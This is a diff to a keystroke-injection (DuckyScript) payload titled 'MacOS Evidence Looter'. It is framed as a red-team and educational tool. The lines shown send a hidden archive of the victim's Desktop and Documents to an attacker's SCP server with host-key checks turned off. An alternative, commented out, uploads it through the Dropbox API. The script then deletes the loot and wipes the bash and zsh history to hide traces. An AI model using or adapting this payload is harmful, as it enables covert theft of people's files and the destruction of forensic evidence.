@@ -1,7 +1,8 @@
-EM Author: un1x01d
+REM Title: MacOS Evidence Looter
+REM Author: un1x01d
 REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an SCP server an deleted.
-REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. Only use this tool on personal or Authorized macs.
-REM Target: MacOS 10.0+ (Built-in ssh/scp)
+REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. This payload has been created ONLY for educational purposes.
+REM Target: MacOS 11.0+ (Built-in ssh/scp)
 REM Version: 1.1
 
 REM DELAY 100
@@ -44,10 +45,30 @@ ENTER
 
 REM ##########################################################################################################################################################################
 REM # SCP the looted files to the attackers SCP server. Delete the looted files and all traces. (This will delete the history and history files to avoid leaving any traces) #
-REM # Usage: Replace the <attaccker username<, <attacker hostname> and <remote storage path>                                                                                 #
+REM # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
+REM # NOTE: The payload is configured to use SSH as the protcol for the file transfer by default. You can use a different method using DropBox to upload the loot            #
 REM ##########################################################################################################################################################################
-STRING wait %1 && clear && scp -q -P 9112 -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <ssh username>@<attacker hostname>:<remote storage path>o && set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && exit
+
+REM ## The SCP way ##
+REM ## Usage: Replace the <port>, <attaccker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server   
+REM ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+STRING wait %1 && clear && scp -q -P <port> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <ssh username>@<attacker hostname>:<remote storage path> \ 
+ENTER 
+DELAY 300
+STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && exit
 ENTER
+
+
+REM ## The Dropbox way ##
+REM ## Usage: Replace the <ACCESS TOKEN> field with you access token, and replace the <DROPBOX DIRECTORY> field with the path where to store the looted file. 
+REM ---------------------------------------------------------------------------------------------------------------------------------------------------------
+REM STRING wait %1 && clear && curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer <ACCESS_TOKEN>" --header "Dropbox-API-Arg: {\"path\": \"/<DROPBOX DIRECTORY>\"}" --header "Content-Type: application/octet-stream" --data-binary @/tmp/.s/.t/.e/.a/.l/.loot.tgz
+DELAY 100
+REM ENTER
+REM DELAY 300
+REM STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && clear && exit
+REM ENTER
+
 
 REM #####################################
 REM # Minimize the window during upload #
